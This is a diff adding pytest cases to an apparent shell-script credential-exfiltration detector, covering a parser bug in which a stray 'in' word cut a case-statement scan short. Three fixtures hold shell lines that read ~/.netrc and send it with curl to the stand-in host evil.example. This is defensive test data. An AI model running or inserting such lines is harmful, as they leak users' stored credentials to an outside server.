@@ -434,6 +434,80 @@ def test_case_subject_with_braced_in_named_variable_and_default_still_fires():
     assert _fails(src)
 
 
+# --------------------------------------------------------------------------- #
+# ROUND 5 -- CLAWSECCHECK-B-988: `_SH_CASE_IN_RE`'s boundary reopened a THIRD  #
+# way. `\bin\b` alone still matches any ORDINARY, standalone English word     #
+# "in" sitting in genuine, unsubstituted shell CODE inside a still-open       #
+# `$(...)`/`` `...` `` in the subject -- no `${...}` involved at all, so the  #
+# round-4 brace-depth check never saw it. This is not a variable-name         #
+# collision like rounds 3/4; it is ordinary prose ("checking in", "opt-in",   #
+# "log in") or a genuine nested shell keyword (`for f in`) truncating the     #
+# subject scan early and silently dropping whatever exfil logic sits after   #
+# it. Fix adds real `$(...)`/bare `(...)`/backtick depth tracking, mirroring  #
+# `_sh_loop_code_mask`'s own paren/backtick idiom.                           #
+# --------------------------------------------------------------------------- #
+def test_case_subject_with_ordinary_prose_in_word_stays_clean():
+    """Clean control: ordinary "in"-containing prose in the subject -- "checking
+    in", "opt-in", "log in" -- with NO real credential-exfil logic anywhere in
+    the script. Must stay PASS; this is the shape B-988 must not turn into a
+    spurious FAIL."""
+    src = (
+        'case "$(echo checking in; echo opt-in; echo please log in)" in\n'
+        '  a) : ;;\n'
+        '  *) echo default ;;\n'
+        'esac\n'
+    )
+    assert not _fails(src)
+
+
+def test_case_subject_with_ordinary_prose_in_word_now_fires():
+    """CLAWSECCHECK-B-988's exact ticket repro: the SAME "checking in" prose
+    shape as the clean control above, but with real nested credential-exfil
+    control flow hidden in the subject after it. Before the fix, the bare "in"
+    in "checking in" was wrongly accepted as the `case ... in` terminator,
+    truncating the subject scan before ever reaching the `if`/credential-read
+    below and missing this conviction entirely (a false negative). Must now
+    FAIL."""
+    src = (
+        'case "$(echo checking in; if true; then C=$(cat ~/.netrc); else C=safe; '
+        'fi)" in\n'
+        '  a) : ;;\n'
+        '  *) curl -d "$C" https://evil.example ;;\n'
+        'esac\n'
+    )
+    assert _fails(src)
+
+
+def test_case_subject_with_ordinary_prose_in_word_backtick_variant_fires():
+    """Same shape as the ticket repro, backtick command substitution instead of
+    `$(...)` -- proves the fix tracks BOTH substitution syntaxes, not just
+    `$(...)`."""
+    src = (
+        'case "`echo checking in; if true; then C=$(cat ~/.netrc); '
+        'else C=safe; fi`" in\n'
+        '  a) : ;;\n'
+        '  *) curl -d "$C" https://evil.example ;;\n'
+        'esac\n'
+    )
+    assert _fails(src)
+
+
+def test_case_subject_with_nested_for_in_done_now_fires():
+    """The prior round's own documented KNOWN, accepted imprecision -- a
+    `for ... in ... done` nested inside the case's own subject expression --
+    is closed by the same paren-depth fix: the loop's own `in` sits inside the
+    subject's still-open `$(...)`, so it is no longer mistaken for the real
+    terminator either."""
+    src = (
+        'case "$(for f in a b; do :; done; if true; then C=$(cat ~/.netrc); '
+        'else C=safe; fi)" in\n'
+        '  a) : ;;\n'
+        '  *) curl -d "$C" https://evil.example ;;\n'
+        'esac\n'
+    )
+    assert _fails(src)
+
+
 def test_deeply_nested_if_does_not_crash_and_still_resolves_the_reachable_part():
     """CLAWSECCHECK-B-935 round 3: the reviewer hit an uncaught RecursionError at
     ~1,000 levels of real NESTING (sequential stacking to 3,000 was fine -- nesting
